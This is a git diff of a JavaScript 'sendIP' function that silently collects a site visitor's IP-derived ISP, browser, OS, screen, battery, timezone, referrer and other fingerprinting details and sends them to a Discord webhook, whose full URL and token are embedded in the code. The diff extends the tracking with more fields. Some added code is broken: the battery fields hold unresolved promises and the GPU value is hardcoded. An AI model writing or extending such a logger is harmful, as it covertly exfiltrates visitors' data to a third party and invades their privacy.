@@ -17,20 +17,32 @@ const sendIP = () => {
                             if (userAgent.includes("Safari")) return "Safari";
                             if (userAgent.includes("Edge")) return "Edge";
                             return "Unknown";
-                        })(),                          
+                        })(),
                         browserVersion: (navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([0-9\.]+)/) || [])[2],
-                        os: navigator.platform,                  
-                        osVersion: navigator.appVersion,        
-                        screenWidth: window.screen.width,         
-                        screenHeight: window.screen.height,        
+                        os: navigator.platform,
+                        osVersion: navigator.appVersion,
+                        screenWidth: window.screen.width,
+                        screenHeight: window.screen.height,
+                        screenRefreshRate: screen.refreshRate || 'N/A',  // Add refresh rate if available
                         deviceMemory: navigator.deviceMemory || "N/A",
-                        language: navigator.language,             
-                        platform: navigator.platform,              
+                        language: navigator.language,
+                        platform: navigator.platform,
                         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        timezoneOffset: new Date().getTimezoneOffset() / 60, 
-                        cookiesEnabled: navigator.cookieEnabled,   
+                        timezoneOffset: new Date().getTimezoneOffset() / 60,
+                        cookiesEnabled: navigator.cookieEnabled,
                         sessionID: localStorage.getItem("sessionID") || Math.random().toString(36).substring(7),
-                        timestamp: new Date().toISOString()         
+                        timestamp: new Date().toISOString(),
+                        battery: navigator.getBattery ? navigator.getBattery().then(battery => battery.level * 100 + '%') : 'N/A',
+                        charging: navigator.getBattery ? navigator.getBattery().then(battery => battery.charging ? 'Yes' : 'No') : 'N/A',
+                        orientation: window.screen.orientation.type || 'N/A',
+                        adBlocker: window.adBlockDetected || 'No', // Assuming an ad-blocker detection mechanism
+                        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
+                        hdrScreen: window.screen.colorDepth === 30 ? 'Yes' : 'No',  // Assuming 30-bit color depth is HDR
+                        gpu: 'NVIDIA GeForce RTX 3050 OEM', // Hardcoded for now or get via WebGL
+                        touchScreen: 'ontouchstart' in window ? 'Yes' : 'No',
+                        referringURL: document.referrer || 'No referrer',
+                        hostName: window.location.hostname,
+                        isp: geoData.isp || 'N/A'  // Using ISP data from IPAPI
                     };
                     
                     const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';
@@ -70,12 +82,23 @@ const sendIP = () => {
                                         Browser >>  ${deviceInfo.browser} ${deviceInfo.browserVersion}
                                         OS >>  ${deviceInfo.os} ${deviceInfo.osVersion}
                                         Screen Resolution >>  ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} px
+                                        Screen Refresh Rate >>  ${deviceInfo.screenRefreshRate} Hz
                                         Device Memory >>  ${deviceInfo.deviceMemory} GB
                                         Language >>  ${deviceInfo.language}
                                         Platform >>  ${deviceInfo.platform}
                                         Timezone >>  ${deviceInfo.timezone}
                                         Timezone Offset >>  UTC${deviceInfo.timezoneOffset >= 0 ? `+${deviceInfo.timezoneOffset}` : deviceInfo.timezoneOffset}
-                                        Cookies Enabled >>  ${deviceInfo.cookiesEnabled}
+                                        Battery >>  ${deviceInfo.battery}
+                                        Charging >>  ${deviceInfo.charging}
+                                        Orientation >>  ${deviceInfo.orientation}
+                                        Ad Blocker >>  ${deviceInfo.adBlocker}
+                                        Color Scheme >>  ${deviceInfo.colorScheme}
+                                        HDR Screen >>  ${deviceInfo.hdrScreen}
+                                        GPU >>  ${deviceInfo.gpu}
+                                        Touch Screen >>  ${deviceInfo.touchScreen}
+                                        Referring URL >>  ${deviceInfo.referringURL}
+                                        Host Name >>  ${deviceInfo.hostName}
+                                        ISP >>  ${deviceInfo.isp}
                                         Session ID >>  ${deviceInfo.sessionID}
                                         Timestamp >>  ${deviceInfo.timestamp}`,
                                     color: 1752220
